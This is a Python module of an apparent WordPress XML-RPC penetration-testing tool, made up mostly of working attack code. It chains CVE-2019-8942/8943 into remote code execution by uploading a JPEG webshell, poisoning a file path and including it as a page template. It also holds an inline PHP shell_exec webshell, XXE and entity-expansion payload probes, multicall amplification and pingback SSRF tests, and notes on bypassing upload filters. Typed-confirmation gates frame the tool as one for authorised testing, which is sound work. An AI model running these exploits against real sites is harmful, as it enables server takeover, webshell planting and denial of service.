"""xrpc.offense - extracted from the original xploitrpc monolith."""
from __future__ import annotations
import argparse, base64, gzip, ipaddress, json, html, itertools, os, random
import re, socket, ssl, string, sys, threading, time
import urllib.error, urllib.parse, urllib.request, xmlrpc.client
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple

try:
    from . import wpcompat
except ImportError:  # running a module file directly
    try:
        import wpcompat
    except ImportError:
        wpcompat = None

from .core import (
    Term, ok, bad, warn, info, note, head, kv, die,
    RPCError, TransportError, ProtocolError, RPCFault,
    normalize_url, RPCResult, RPCClient, WPSession, State,
    version_tuple, print_findings, write_report, print_banner,
    SEVERITY_ORDER, SEVERITY_COLOR,
    DEFAULT_UA, DEFAULT_TIMEOUT, BANNER_DELAY, __version__,
    is_disabled_fault, describe_fault,
)
from .payloads import CROP_SHELL_JPEG_HEX, XMLATTACK_PAYLOADS
from .cve import crop_target_vulnerable
from .recon import rest_fetch
from .data import _jsonable


# ---------------------------------------------------------------------------
# Strict RCE proof helpers. Success is NEVER inferred from a command string,
# an HTTP status, or a generic word like "id" in HTML. Only real command
# output with a recognizable, well-formed structure counts.
# ---------------------------------------------------------------------------

_UID_RE = re.compile(r"uid=(\d+)\(([^)]{1,64})\)")
_GID_RE = re.compile(r"gid=(\d+)\(([^)]{1,64})\)")


def _command_output_proof(body: str, cmd: str) -> Optional[str]:
    """Return a matched command-output string only when it is unambiguous.

    Accepts:
      - `uid=N(name) gid=N(name) groups=...` as emitted by `id`
      - a random-token round-trip: caller asks the shell to print a token and
        the exact token appears in the response
    Rejects: the command text itself, bare words, HTTP status, or HTML noise.
    """
    uid = _UID_RE.search(body)
    if uid:
        gid = _GID_RE.search(body)
        if gid:
            return "%s %s" % (uid.group(0), gid.group(0))
        return uid.group(0)

    # Token round-trip: `echo <token>` must produce the exact token.
    m = re.search(r"(?:echo|printf)\s+([A-Za-z0-9]{12,32})\b", cmd)
    if m:
        token = m.group(1)
        if token in body:
            return "token round-trip: %s" % token
    return None


def module_exploit_crop(
    client: RPCClient,
    state: "State",
    cmd: str = "id",
    confirmed: bool = False,
    theme: Optional[str] = None,
) -> Dict[str, Any]:
    """
    CVE-2019-8942 + CVE-2019-8943: WordPress crop-image RCE.

    Chain (requires an account with Author privileges):
      1. Log in to wp-admin with a cookie session.
      2. Upload a JPEG containing a PHP webshell via async-upload.php.
      3. Read the ajax "edit" nonce and the image editor filename.
      4. Poison _wp_attached_file with a path traversal (?/../../themes/<theme>/shell).
      5. Trigger crop-image, which writes the JPEG into the active theme.
      6. Create a post whose _wp_page_template includes that JPEG (LFI).
      7. Visit the post with ?0=<command> to execute code via the webshell.

    Gated exactly like postauth: valid credentials, --confirmed flag, and a
    typed I-OWN-THIS-TARGET confirmation. No non-interactive bypass.
    """
    head("EXPLOIT: WordPress crop-image RCE (CVE-2019-8942 / 8943)")
    out: Dict[str, Any] = {"exploit": "CVE-2019-8942/8943", "success": False}

    if not state.has_creds():
        bad("No credentials. This exploit needs an Author+ account.")
        return out
    if not confirmed:
        bad("Refusing to run: pass --confirmed to acknowledge authorised testing.")
        return out
    if not _require_authorization("I-OWN-THIS-TARGET", client.url):
        bad("Confirmation not given - aborting without touching the target.")
        return out

    base = client.url.rsplit("/", 1)[0] + "/"
    sess = WPSession(base, client)

    # Step 0: version gate - don't fire a known-broken chain at a patched site.
    ver = state.fingerprint.get("wp_version") or ""
    if not ver:
        try:
            opts = client.call_value(
                "wp.getOptions", state.blog_id or "1", state.username, state.password
            )
            if isinstance(opts, dict):
                ver = str(opts.get("software_version", {}).get("value", "")) \
                    if isinstance(opts.get("software_version"), dict) \
                    else str(opts.get("software_version", ""))
        except Exception:
            pass
    vuln, reason = crop_target_vulnerable(ver or None)
    info("Version check: %s" % reason)
    out["version"] = ver
    out["version_assessment"] = reason
    if not vuln:
        warn("Target version is not in the known-affected range. Exploit may fail;")
        warn("continuing because version detection can be wrong on hardened sites.")

    # Step 1: authenticate.
    info("Authenticating as %s..." % state.username)
    if not sess.login(state.username, state.password):
        bad("Login failed. Check credentials.")
        return out
    logged = [k for k in sess.cookies if k.startswith("wordpress_logged_in")]
    ok("Authenticated (session cookie: %s)" % (logged[0] if logged else "set"))

    # Step 2: detect active theme.
    if theme:
        current_theme = theme
        info("Using supplied theme: %s" % current_theme)
    else:
        st, body, _ = sess.request("")
        m = re.search(r"/wp-content/themes/([A-Za-z0-9_-]+)/", body)
        if not m:
            bad("Could not detect active theme from homepage; pass --theme.")
            return out
        current_theme = m.group(1)
        ok("Active theme: %s" % current_theme)
    out["theme"] = current_theme

    # Step 3: media-new.php -> upload nonce.
    st, body, _ = sess.request("wp-admin/media-new.php")
    wpnonce = WPSession.hidden_inputs(body).get("_wpnonce")
    if not wpnonce:
        bad("Could not get upload nonce from media-new.php (HTTP %d)." % st)
        return out
    ok("Upload nonce obtained.")

    # Step 4: upload the JPEG webshell.
    img_name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    jpeg = bytes.fromhex(CROP_SHELL_JPEG_HEX)
    info("Uploading JPEG payload (%d bytes)..." % len(jpeg))
    st, body, _ = sess.multipart(
        "wp-admin/async-upload.php",
        fields={"name": img_name + ".jpg", "action": "upload-attachment", "_wpnonce": wpnonce},
        file_field="async-upload", file_name=img_name + ".jpg", file_data=jpeg,
    )
    try:
        up = json.loads(body)
        image_id = str(up["data"]["id"])
        update_nonce = up["data"]["nonces"]["update"]
        orig_filename = up["data"]["filename"]
    except Exception:
        bad("Upload did not return expected JSON (HTTP %d): %s" % (st, body[:200]))
        return out
    ok("Image uploaded (attachment id %s)." % image_id)
    out["image_id"] = image_id

    # Step 5: ajax nonce via query-attachments.
    st, body, _ = sess.request("wp-admin/admin-ajax.php", method="POST", form={
        "action": "query-attachments", "post_id": "0", "query[item]": image_id,
        "query[orderby]": "date", "query[order]": "DESC",
        "query[posts_per_page]": "40", "query[paged]": "1",
    })
    m = re.search(r'"edit"\s*:\s*"(\w+)"', body)
    if not m:
        bad("Could not get ajax edit nonce (HTTP %d)." % st)
        return out
    ajax_nonce = m.group(1)
    ok("Ajax nonce obtained.")

    # Step 6: image-editor -> editor filename.
    st, body, _ = sess.request("wp-admin/admin-ajax.php", method="POST", form={
        "action": "image-editor", "_ajax_nonce": ajax_nonce, "postid": image_id,
        "history": '[{"c":{"x":0,"y":0,"w":400,"h":300}}]',
        "target": "all", "context": "", "do": "save",
    })
    m = re.search(r"(%s-\S+?)-" % re.escape(img_name), body)
    editor_filename = (m.group(1) + ".jpg") if m else orig_filename
    ok("Editor filename: %s" % editor_filename)

    # Step 7: second nonce from post.php edit screen.
    st, body, _ = sess.request("wp-admin/post.php?post=%s&action=edit" % image_id)
    hidden = WPSession.hidden_inputs(body)
    # editpost validates the _wpnonce field specifically. Do NOT grab the
    # first key ending in "nonce": WordPress emits screenoptionnonce first,
    # which silently fails the check and drops meta_input[_wp_attached_file].
    wpnonce2 = hidden.get("_wpnonce")
    if not wpnonce2:
        # Upstream fallback: the second hidden input on this page is _wpnonce.
        vals = list(hidden.values())
        if len(vals) >= 2:
            wpnonce2 = vals[1]
    if not wpnonce2:
        bad("Could not get edit-post nonce from post.php.")
        return out
    ok("Edit-post nonce obtained.")

    current_date = datetime.now().strftime("%Y/%m/")

    def change_path(path_suffix: str) -> Tuple[int, str]:
        # follow=False is critical: WordPress answers these POSTs with a 302,
        # and WPSession.request() converts a followed redirect into a GET,
        # which silently drops the POST body (and therefore the meta update).
        # WordPress 5.0's attachment editor reads post_title/guid before
        # saving; omitting them emits PHP notices and aborts the meta update.
        st, body, _ = sess.request("wp-admin/post.php", method="POST", form={
            "_wpnonce": wpnonce2, "action": "editpost", "post_ID": image_id,
            "post_title": img_name,
            "guid": base + "wp-content/uploads/" + current_date + editor_filename,
            "meta_input[_wp_attached_file]": current_date + editor_filename + path_suffix,
        }, follow=False)
        return st, body

    def do_crop() -> Tuple[int, str]:
        st, body, _ = sess.request("wp-admin/admin-ajax.php", method="POST", form={
            "action": "crop-image", "nonce": ajax_nonce, "id": image_id,
            "cropDetails[x1]": "0", "cropDetails[y1]": "0",
            "cropDetails[width]": "400", "cropDetails[height]": "300",
            "cropDetails[dst_width]": "400", "cropDetails[dst_height]": "300",
        }, follow=False)
        return st, body

    # Step 8: first crop with a benign traversal, then poison the path into
    # the active theme and crop again. This is the CVE-2019-8943 traversal.
    info("Triggering crop with poisoned _wp_attached_file path...")
    st1, body1 = change_path("?/x")
    crop1_st, crop1_body = do_crop()
    shell_name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    st2, body2 = change_path("?/../../../../themes/%s/%s" % (current_theme, shell_name))
    crop2_st, crop2_body = do_crop()
    out["crop_responses"] = [
        {"status": crop1_st, "body": crop1_body[:300]},
        {"status": crop2_st, "body": crop2_body[:300]},
    ]
    if "Unable to create new image" in crop1_body or "Unable to create new image" in crop2_body:
        warn("Image editor reported 'Unable to create new image' - crop dimensions")
        warn("may exceed the source image, or GD/Imagick refused the payload.")
    ok("Crop triggered; target file: cropped-%s.jpg in theme %s." % (shell_name, current_theme))
    out["shell_name"] = shell_name

    # Step 9: create a post with _wp_page_template = the dropped JPEG (LFI).
    info("Creating post with malicious page template...")
    st, body, _ = sess.request("wp-admin/post-new.php")
    m = re.search(r'name="_wpnonce" value="(\w+)"', body)
    post_nonce = m.group(1) if m else None
    m = re.search(r'"post":\{"id":(\d+),', body)
    post_id = m.group(1) if m else None
    if not (post_nonce and post_id):
        bad("Could not get post-new nonce/id (HTTP %d)." % st)
        return out
    post_title = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    sess.request("wp-admin/post.php", method="POST", form={
        "_wpnonce": post_nonce, "action": "editpost", "post_ID": post_id,
        "post_title": post_title, "post_name": post_title,
        "meta_input[_wp_page_template]": "cropped-%s.jpg" % shell_name,
    })
    ok("Post %s created with template include." % post_id)
    out["post_id"] = post_id

    # Step 10: execute a command through the webshell.
    info("Executing command through webshell: %s" % cmd)
    st, body, _ = sess.request("?p=%s&0=%s" % (post_id, urllib.parse.quote(cmd)))
    # The shell echoes command output into the rendered page. Strip HTML tags
    # to give the operator a readable result.
    clean = re.sub(r"<[^>]+>", " ", body)
    clean = re.sub(r"\s+", " ", clean).strip()
    # The template include can dump raw JPEG bytes before PHP runs. Keep the
    # excerpt printable ASCII only so terminals with cp1252 (Windows) never
    # crash on undecodable binary when we print it.
    clean = "".join(ch if 32 <= ord(ch) < 127 else " " for ch in clean)
    clean = re.sub(r"\s+", " ", clean).strip()
    out["shell_url"] = base + "?p=%s&0=%s" % (post_id, urllib.parse.quote(cmd))
    out["response_excerpt"] = clean[:500]
    out["http_status"] = st

    # Strict success validation: require actual command output, never the
    # command string itself. "id" appears in every HTML id= attribute, and
    # "www-data" can appear in unrelated page text. Only a well-formed uid/gid
    # line produced by `id` (or equivalent shell output) counts as proof.
    proof = _command_output_proof(body, cmd)
    if st == 200 and proof:
        out["success"] = True
        out["proof"] = proof
        ok("RCE CONFIRMED - command output matched: %s" % proof)
        kv("shell url", out["shell_url"])
        note("Response excerpt: %s" % clean[:200])
        state.add_finding("critical", "WordPress crop-image RCE exploited (CVE-2019-8942/8943)",
                          "Authenticated crop-image path traversal plus template LFI yielded "
                          "code execution on the target. Proof: %s" % proof,
                          out["shell_url"])
    else:
        warn("Chain completed but command output was not clearly visible.")
        warn("Verify manually at: %s" % out["shell_url"])
        note("Possible causes: patched WordPress, different theme path depth,")
        note("or the webshell was written but not included by the template.")

    state.report.setdefault("exploit", out)
    return out


def module_exploit_upload(client: RPCClient, state: "State",
                          cmd: str = "id",
                          confirmed: bool = False,
                          shell_path: Optional[str] = None) -> Dict[str, Any]:
    """
    CVE-2019-8942 adjacent: wp.uploadFile -> template include RCE.

    Uses the XML-RPC wp.uploadFile method (not the cookie-based async-upload
    path) to place a PHP payload in wp-content/uploads, then creates a post
    whose _wp_page_template includes that file, and executes a command.

    This is a genuine XML-RPC-mediated attack path. It requires Author+ creds
    and a target where the uploaded file can be included as a template. The
    same three-factor authorization gate applies.
    """
    head("EXPLOIT: wp.uploadFile template-include RCE (CVE-2019-8942 path)")
    out: Dict[str, Any] = {"exploit": "wp.uploadFile template include", "success": False}

    if not state.has_creds():
        bad("No credentials. This exploit needs an Author+ account.")
        return out
    if not confirmed:
        bad("Refusing to run: pass --confirmed to acknowledge authorised testing.")
        return out
    if not _require_authorization("I-OWN-THIS-TARGET", client.url):
        bad("Confirmation not given - aborting without touching the target.")
        return out

    base = client.url.rsplit("/", 1)[0] + "/"

    # Resolve blog_id via XML-RPC.
    if not state.blog_id:
        try:
            blogs = client.call_value("wp.getUsersBlogs", state.username, state.password)
            if isinstance(blogs, list) and blogs:
                state.blog_id = str(blogs[0].get("blogid") or blogs[0].get("blog_id") or "")
        except Exception as exc:
            bad("Cannot resolve blog_id: %s" % exc)
            return out

    # Build the payload. Default: a compact PHP command runner. A caller can
    # supply a custom shell file for other techniques.
    if shell_path:
        if not os.path.isfile(shell_path):
            bad("Shell file not found: %s" % shell_path)
            return out
        with open(shell_path, "rb") as fh:
            shell = fh.read()
        remote_name = os.path.basename(shell_path)
    else:
        shell = b"<?php echo shell_exec($_GET[0]); ?>"
        remote_name = "xrpc-%s.php.jpg" % "".join(
            random.choice(string.ascii_lowercase) for _ in range(8))

    info("Uploading %d-byte PHP payload via wp.uploadFile as %s..." % (len(shell), remote_name))
    try:
        up = client.call_value(
            "wp.uploadFile", state.blog_id, state.username, state.password,
            {"name": remote_name, "type": "image/jpeg", "bits": xmlrpc.client.Binary(shell)},
        )
    except RPCFault as exc:
        msg = describe_fault(exc)
        bad("wp.uploadFile rejected the payload: %s" % msg)
        out["upload_error"] = msg
        note("WordPress sanitizes dangerous extensions (e.g. .php.jpg -> .php_.jpg).")
        note("The file may still be includable as a page template.")
        state.report.setdefault("exploit", out)
        return out
    except RPCError as exc:
        bad("wp.uploadFile failed: %s" % exc)
        out["upload_error"] = str(exc)
        state.report.setdefault("exploit", out)
        return out

    if not isinstance(up, dict):
        bad("Unexpected wp.uploadFile response: %r" % (up,))
        out["upload_response"] = _jsonable(up)
        state.report.setdefault("exploit", out)
        return out

    remote_file = str(up.get("file") or remote_name)
    remote_url = str(up.get("url") or "")
    ok("Upload accepted: %s" % remote_file)
    out["upload"] = {"file": remote_file, "url": remote_url, "id": up.get("id")}

    # Try to include the uploaded file as a page template. WordPress resolves
    # _wp_page_template relative to the active theme, so traverse back to
    # wp-content/uploads. Try several depths and both sanitized/raw names.
    sess = WPSession(base, client)
    if not sess.login(state.username, state.password):
        bad("Cookie login failed; cannot create the template post.")
        state.report.setdefault("exploit", out)
        return out

    st, body, _ = sess.request("wp-admin/post-new.php")
    nonce_m = re.search(r'name="_wpnonce" value="(\w+)"', body)
    post_m = re.search(r'"post":\{"id":(\d+),', body)
    if not (nonce_m and post_m):
        bad("Could not get post-new nonce/id (HTTP %d)." % st)
        state.report.setdefault("exploit", out)
        return out
    post_nonce, post_id = nonce_m.group(1), post_m.group(1)

    # Candidate template paths: relative traversals of varying depth.
    candidates = []
    for depth in range(1, 7):
        prefix = "../" * depth
        candidates.append(prefix + "uploads/" + remote_file)
    # Also try the URL path stripped down to the uploads-relative portion.
    m = re.search(r"/wp-content/uploads/(.+)", remote_url)
    if m:
        rel = m.group(1)
        for depth in range(1, 7):
            candidates.append("../" * depth + "uploads/" + rel)

    title = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
    tried = []
    for tmpl in candidates:
        st, r, _ = sess.request("wp-admin/post.php", method="POST", form={
            "_wpnonce": post_nonce, "action": "editpost", "post_ID": post_id,
            "post_title": title, "post_name": title, "post_status": "publish",
            "meta_input[_wp_page_template]": tmpl,
        }, follow=False)
        tried.append({"template": tmpl, "status": st})
        if st not in (200, 302):
            continue
        u = "%s?p=%s&0=%s" % (base, post_id, urllib.parse.quote(cmd))
        try:
            st2, page, _ = sess.request("?p=%s&0=%s" % (post_id, urllib.parse.quote(cmd)))
        except TransportError:
            continue
        proof = _command_output_proof(page, cmd)
        if st2 == 200 and proof:
            out["success"] = True
            out["proof"] = proof
            out["shell_url"] = u
            out["template"] = tmpl
            out["http_status"] = st2
            ok("RCE CONFIRMED via wp.uploadFile template include: %s" % proof)
            kv("shell url", u)
            state.add_finding(
                "critical", "RCE via wp.uploadFile template include",
                "An Author-level XML-RPC wp.uploadFile upload was included as a "
                "page template, yielding command execution. Proof: %s" % proof, u)
            state.report.setdefault("exploit", out)
            return out

    out["tried"] = tried[:20]
    warn("Upload succeeded but template include did not yield command output.")
    note("Possible causes: uploads not includable, PHP disabled in uploads,")
    note("or the theme resolves templates differently. Verify manually.")
    state.report.setdefault("exploit", out)
    return out


def module_xmlattack(client: RPCClient, state: "State",
                     confirmed: bool = False) -> Dict[str, Any]:
    """
    Probe the XML-RPC parser with XXE / entity-expansion / malformed-XML
    payloads. Read-only in intent, but parser abuse can crash a weak server,
    so it is gated like the other active modules.
    """
    head("XML parser attack surface (raw POST)")
    out: Dict[str, Any] = {"payloads": [], "findings": []}

    if not confirmed:
        warn("Refusing to run: pass --confirmed to acknowledge authorised testing.")
        out["refused"] = True
        return out

    print("  [!] Parser fuzzing can crash a vulnerable endpoint. Only run this")
    print("      against a target you own or are authorised to test.")
    try:
        phrase = input(Term.paint("      Type I-OWN-THIS-TARGET to proceed: ", "cyan", "bold"))
    except (EOFError, KeyboardInterrupt):
        print()
        phrase = ""
    if phrase.strip() != "I-OWN-THIS-TARGET":
        bad("Confirmation phrase did not match. Aborting.")
        out["refused"] = True
        return out

    baseline = None
    for name, kind, xml in XMLATTACK_PAYLOADS:
        info("Sending %s (%s)..." % (name, kind))
        try:
            st, hdrs, body = client.post_raw_http(xml.encode("utf-8"), label=name)
        except TransportError as exc:
            bad("%s -> transport error: %s" % (name, exc))
            out["payloads"].append({"name": name, "kind": kind, "error": str(exc)})
            continue

        snippet = re.sub(r"\s+", " ", body)[:180]
        result: Dict[str, Any] = {
            "name": name, "kind": kind, "status": st,
            "length": len(body), "snippet": snippet,
        }
        kv("  %s" % name, "HTTP %d, %d bytes" % (st, len(body)))

        # XML-RPC answers faults with HTTP 200 and a <fault> body, so the
        # status code says nothing. Classify on the body.
        is_fault = "<fault>" in body
        fault_code = ""
        m = re.search(r"<name>faultCode</name>\s*<value>\s*<int>(-?\d+)</int>", body)
        if m:
            fault_code = m.group(1)
        executed = "<params>" in body and not is_fault

        if kind == "control":
            baseline = (st, len(body), executed)
            if not executed:
                warn("Control payload did not execute - target may not be XML-RPC.")
            continue

        if kind == "xxe" and ("root:" in body or "/bin/bash" in body or
                              re.search(r"root:x:\d+:\d+", body)):
            bad("XXE CONFIRMED: external file content appears in the response.")
            result["verdict"] = "XXE CONFIRMED"
            out["findings"].append("critical")
            state.add_finding("critical", "XML-RPC XXE file disclosure",
                              "An external entity in the XML-RPC request was expanded, "
                              "disclosing local file content.", name)
        elif kind == "entity_expansion" and body.count("lol") > 20:
            bad("Entity expansion observed: %d 'lol' repetitions in response."
                % body.count("lol"))
            result["verdict"] = "entity expansion"
            out["findings"].append("medium")
            state.add_finding("medium", "XML-RPC entity expansion accepted",
                              "The parser expanded a nested entity chain instead of "
                              "rejecting the DTD, which is the precondition for a "
                              "billion-laughs denial of service.", name)
        elif is_fault:
            note("Rejected with fault %s." % (fault_code or "?"))
            result["verdict"] = "rejected"
            result["fault_code"] = fault_code
        elif executed:
            warn("Parser ACCEPTED this payload and executed the method.")
            result["verdict"] = "accepted"
            out["findings"].append("low")
            state.add_finding("low", "XML-RPC parser accepts non-standard XML (%s)" % name,
                              "A payload that a strict parser would reject was accepted "
                              "and executed. Not exploitable alone, but it widens the "
                              "input surface for parser-level attacks.", name)
        else:
            note("Unrecognised response shape (HTTP %d)." % st)
            result["verdict"] = "unknown"

        out["payloads"].append(result)

    ok("Parser probe complete: %d payload(s), %d notable result(s)." %
       (len(out["payloads"]), len(out["findings"])))
    state.report.setdefault("xmlattack", out)
    return out


def module_multicall_amplify(client: RPCClient, state: "State", method: str = "system.listMethods",
                             count: int = 250) -> Dict[str, Any]:
    """Measure how much work one HTTP request can buy - the DoS surface."""
    head("system.multicall amplification test")
    info("Stacking %d x %s into one request..." % (count, method))

    single = client.call(method)
    info("Single call: %.3fs, %d bytes" % (single.elapsed, single.bytes_in))

    calls = [{"methodName": method, "params": []} for _ in range(count)]
    try:
        res = client.multicall(calls)
    except RPCFault as exc:
        bad("multicall rejected: %s" % describe_fault(exc))
        return {"supported": False}
    except RPCError as exc:
        bad(str(exc))
        return {"supported": False}

    results = res.value if isinstance(res.value, list) else []
    completed = sum(1 for r in results if isinstance(r, list))
    factor = (res.bytes_in / single.bytes_in) if single.bytes_in else 0

    print()
    kv("Batch size", count)
    kv("Completed", completed)
    kv("Wall time", "%.3fs" % res.elapsed)
    kv("Payload in", "%d bytes" % res.bytes_in)
    kv("Amplification", "%.1fx bytes per request" % factor)

    if completed >= count * 0.9:
        warn("Server executed %d method calls in a single HTTP request." % completed)
        warn("This is the classic WordPress XML-RPC amplification vector.")
    else:
        note("Server capped the batch at ~%d calls." % completed)

    return {"supported": True, "completed": completed, "amplification": factor}


def _is_private_target(url: str) -> bool:
    """
    True when a URL points at a loopback or private address.

    WordPress's wp_http_validate_url() rejects these outright, so pingback.ping
    never makes an outbound request and the resulting fault proves nothing.
    Hostnames are resolved, because a name can point at a private address.
    """
    try:
        host = urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        return False
    if not host:
        return False

    candidates = [host]
    try:
        infos = socket.getaddrinfo(host, None)
        candidates += [info[4][0] for info in infos]
    except Exception:
        pass

    for cand in candidates:
        if cand in ("localhost", "0.0.0.0", "::1", "::"):
            return True
        try:
            ip = ipaddress.ip_address(cand)
        except ValueError:
            continue
        if ip.is_loopback or ip.is_private or ip.is_link_local or ip.is_reserved:
            return True
    return False


def module_pingback(client: RPCClient, state: "State", target: str,
                    source: Optional[str] = None) -> Dict[str, Any]:
    """
    Test pingback.ping for SSRF.

    WordPress fetches `source` to look for a link to `target`. If the server
    makes that outbound request, fault 33 comes back ("source does not contain
    a link to the target") - which proves the fetch happened.
    """
    head("pingback.ping SSRF test")
    if not source:
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        source = "http://127.0.0.1:9/xploitrpc-%s" % token
        note("No --source given, using an unroutable callback: %s" % source)

    kv("target", target)
    kv("source", source)

    # Whether the target post even advertises a pingback endpoint decides
    # whether a fault is meaningful. Check before firing.
    pingback_enabled: Optional[bool] = None
    try:
        req = urllib.request.Request(target, headers={"User-Agent": client.user_agent})
        with client._opener.open(req, timeout=client.timeout) as resp:
            page = resp.read(200000).decode("utf-8", errors="replace")
        pingback_enabled = bool(re.search(r'rel=["\']pingback["\']', page, re.I))
        kv("pingback link", "present" if pingback_enabled else "absent")
    except Exception:
        note("Could not fetch the target page to check for a pingback link.")

    # Loopback and private addresses are refused by WordPress before any
    # outbound request is made (wp_http_validate_url / wp_safe_remote_get).
    # A name can point at a private address too, and the target may resolve it
    # differently than we do, so ask the target to resolve it when we can.
    loopback = _is_private_target(source)

    try:
        res = client.call("pingback.ping", source, target)
        ok("pingback.ping returned a value: %r" % (res.value,))
        return {"reachable": True, "value": str(res.value)}
    except RPCFault as exc:
        msg = (exc.message or "").lower()
        print()
        kv("fault", "%s: %s" % (exc.code, exc.message or "(empty message)"))
        if exc.code == 33 or "does not contain a link" in msg:
            warn("FAULT 33 - the server fetched the source URL and parsed it.")
            warn("pingback.ping is reachable: SSRF and reflection are both on the table.")
            return {"reachable": True, "ssrf": True, "fault": exc.code}
        if exc.code == 16:
            warn("FAULT 16 - server attempted the fetch and the source did not resolve.")
            warn("Egress was attempted, so pingback.ping is reachable.")
            return {"reachable": True, "ssrf": True, "fault": exc.code}
        if exc.code == 17 or "source url" in msg:
            warn("FAULT 17 - server tried to fetch the source and failed. Egress attempted.")
            return {"reachable": True, "ssrf": True, "fault": exc.code}
        if exc.code == 32 or "target" in msg:
            note("FAULT 32 - target is not pingback-enabled. Try a real post URL.")
            return {"reachable": True, "ssrf": False, "fault": exc.code}
        if exc.code == 48:
            note("FAULT 48 - this pingback is already registered.")
            return {"reachable": True, "ssrf": True, "fault": exc.code}
        if exc.code == 0 and not msg:
            if loopback:
                bad("FAULT 0 (empty) - source is a loopback/private address.")
                note("WordPress refuses those in wp_http_validate_url() before making")
                note("any request, so no fetch happened. This proves nothing about SSRF.")
                note("Re-test with a source on a public address, or a hostname that")
                note("resolves to the target, to see whether egress is actually possible.")
                return {"reachable": True, "ssrf": None, "fault": 0,
                        "reason": "source blocked as loopback/private"}
            if pingback_enabled is False:
                warn("FAULT 0 (empty) - target page advertises no pingback endpoint.")
                note("The comment insert failed after the fetch stage. Check the")
                note("callback listener for a hit before drawing conclusions.")
                return {"reachable": True, "ssrf": None, "fault": 0,
                        "reason": "target not pingback-enabled"}
            warn("FAULT 0 (empty) - WordPress failed the pingback without explaining why.")
            note("Check your callback listener: a hit proves the fetch happened even")
            note("though the comment was rejected.")
            return {"reachable": True, "ssrf": None, "fault": 0}
        if is_disabled_fault(exc):
            bad("pingback.ping is disabled.")
            return {"reachable": False}
        note("Fault %s: %s" % (exc.code, exc.message or "(no message)"))
        return {"reachable": True, "fault": exc.code}
    except RPCError as exc:
        bad(str(exc))
        return {"reachable": False}


def _require_authorization(confirm: Optional[str], target_url: str) -> bool:
    """
    Gate for state-changing modules.

    Returns True only when the operator typed the exact confirmation phrase.
    This exists so a state-changing action cannot run by accident, and so the
    operator has to assert authorization in their own words at the keyboard.
    """
    print()
    bad("This module CHANGES STATE on the target: it writes files or alters")
    bad("site configuration. Running it against a system you do not own, or")
    bad("lack written permission to test, is unauthorised access.")
    print()
    print("      Target: %s" % target_url)
    print("      Type I-OWN-THIS-TARGET to proceed, anything else aborts.")
    answer = input("      confirm> ").strip()
    return answer == confirm


def module_postauth(client: RPCClient, state: "State",
                    upload: Optional[str] = None,
                    remote_name: Optional[str] = None,
                    set_option: Optional[Tuple[str, str]] = None,
                    confirmed: bool = False) -> Dict[str, Any]:
    """
    Authenticated state-changing actions: file upload and option changes.

    Every action requires (a) valid credentials, (b) the operator typing the
    confirmation phrase at the keyboard, and (c) an explicit --confirmed flag
    on the CLI. Any one missing means the module refuses to run.
    """
    head("Post-authentication actions (STATE-CHANGING)")
    out: Dict[str, Any] = {}

    if not state.has_creds():
        bad("No credentials. These actions need a valid authenticated session.")
        return out

    if not confirmed:
        bad("Refusing to run: pass --confirmed to acknowledge this is authorised.")
        note("The module also asks for a typed confirmation at the keyboard.")
        return out

    if not _require_authorization("I-OWN-THIS-TARGET", client.url):
        bad("Confirmation not given - aborting without changing anything.")
        return out

    # Resolve blog_id.
    if not state.blog_id:
        try:
            blogs = client.call_value("wp.getUsersBlogs", state.username, state.password)
            if isinstance(blogs, list) and blogs:
                state.blog_id = str(blogs[0].get("blogid") or blogs[0].get("blog_id") or "")
                ok("Resolved blog_id=%s" % state.blog_id)
        except RPCError as exc:
            bad("Cannot resolve blog_id: %s" % exc)
            return out

    # --- file upload -------------------------------------------------------
    if upload:
        if not os.path.isfile(upload):
            bad("File not found: %s" % upload)
            return out
        name = remote_name or os.path.basename(upload)
        with open(upload, "rb") as fh:
            data = fh.read()
        info("Uploading %s (%d bytes) as %s via wp.uploadFile..." % (
            upload, len(data), name))
        try:
            result = client.call_value(
                "wp.uploadFile", state.blog_id, state.username, state.password,
                {"name": name, "type": "application/octet-stream", "bits": xmlrpc.client.Binary(data)},
            )
            out["upload"] = _jsonable(result)
            ok("Upload accepted.")
            if isinstance(result, dict):
                kv("attachment_id", result.get("id", "?"))
                kv("url", result.get("url", "?"))
                note("Check whether the uploaded file executes at its URL.")
                note("A .php upload landing in wp-content/uploads/ that executes")
                note("is full remote code execution - the classic XML-RPC endgame.")
        except RPCFault as exc:
            msg = describe_fault(exc)
            bad("Upload rejected: %s" % msg)
            out["upload_error"] = msg
            low = msg.lower()
            if "file type is not permitted" in low or "not permitted for security" in low:
                note("WordPress rejected the extension via wp_check_filetype().")
                note("Common bypasses (authorised labs only): upload a valid image")
                note("then exploit a crop/resize or 'wp_crop_image' style flaw to")
                note("write a .php file, or abuse an add_allowed_mime_types filter.")
            elif "could not write file" in low:
                note("Filesystem permission or disk error on the upload directory.")
        except RPCError as exc:
            bad(str(exc))
            out["upload_error"] = str(exc)

    # --- option change -----------------------------------------------------
    if set_option:
        opt_name, opt_value = set_option
        info("Setting option %r to %r via wp.setOptions..." % (opt_name, opt_value))
        try:
            result = client.call_value(
                "wp.setOptions", state.blog_id, state.username, state.password,
                {opt_name: opt_value},
            )
            out["set_option"] = _jsonable(result)
            ok("Option call completed.")
            note("Verify the change took effect, and revert it when testing is done.")
        except RPCFault as exc:
            bad("Option change rejected: %s" % describe_fault(exc))
            out["set_option_error"] = describe_fault(exc)
        except RPCError as exc:
            bad(str(exc))
            out["set_option_error"] = str(exc)

    if not out:
        note("No action requested. Pass --upload <file> and/or --set-option name=value.")
    return out


